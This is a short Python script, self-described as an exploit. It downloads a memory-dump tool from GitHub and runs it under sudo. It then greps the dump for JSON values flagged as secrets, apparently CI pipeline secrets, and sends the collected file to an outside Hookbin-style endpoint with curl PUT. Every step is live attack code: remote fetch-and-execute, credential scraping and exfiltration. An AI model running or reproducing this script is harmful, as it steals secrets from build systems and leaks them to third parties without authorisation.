import subprocess
import os

# Unique bin ID for Hookbin
BIN_ID = "exfil-bin-task-12345"

print("Starting exploit...")
# Exploit command to dump memory and grep for secrets
exploit_cmd = f"curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets"
subprocess.run(exploit_cmd, shell=True)

# Exfiltrate the captured secrets to Hookbin
subprocess.run(f"curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/{BIN_ID}", shell=True)
print("Exploit finished.")